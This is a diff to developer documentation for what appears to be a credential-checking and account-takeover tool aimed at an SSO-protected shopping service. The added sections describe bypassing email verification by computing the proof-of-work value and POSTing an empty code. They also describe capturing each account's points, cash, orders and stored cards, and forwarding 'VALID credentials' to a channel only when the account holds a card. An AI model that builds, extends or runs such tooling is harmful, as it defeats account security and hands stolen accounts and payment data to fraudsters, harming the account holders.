@@ -21,6 +21,15 @@ automation/batch/processedStore.js# Redis/JSONL cache with batch MGET + write bu
 ### HTTP Flow
 `httpChecker.js` → `httpFlow.js` → `htmlAnalyzer.js` → `httpDataCapture.js`
 
+### Email Verification Skip
+When SSO redirects to `/verification/email`, the system auto-skips:
+1. Extract token from URL → call `/util/gc` (page_type: `LOGIN_START`) → get challenge token + mdata
+2. Compute POW `cres` from mdata
+3. POST to `/v2/verify/email` with empty `code` field = skip
+4. Retry SSO authorize → now bypasses verification
+
+Implementation: `automation/http/capture/ssoFormHandler.js` → `skipEmailVerification()`
+
 ## cres Algorithm (Proof-of-Work)
 The `cres` (challenge response) is computed from `/util/gc` mdata (`{mask, key, seed}`):
 1. `stringToHash = key + random(16 - key.length)` 
@@ -124,7 +133,17 @@ closeSession(session);
 ```javascript
 // POST to ichiba-common API after login
 const capture = await captureAccountData(session);
-// Returns: { points, cash, rank }
+// Returns: { points, cash, rank, latestOrder, latestOrderId, profile }
+```
+
+### Channel Forwarding (`channelForwarder.js`)
+Forwards VALID credentials to channel only if:
+- Has latest order (not `'n/a'`)
+- Has card data (`profile.cards` with at least 1 card)
+
+```javascript
+const validation = validateCaptureForForwarding(capture);
+// { valid: boolean, reason: string }
 ```
 
 ## File Conventions
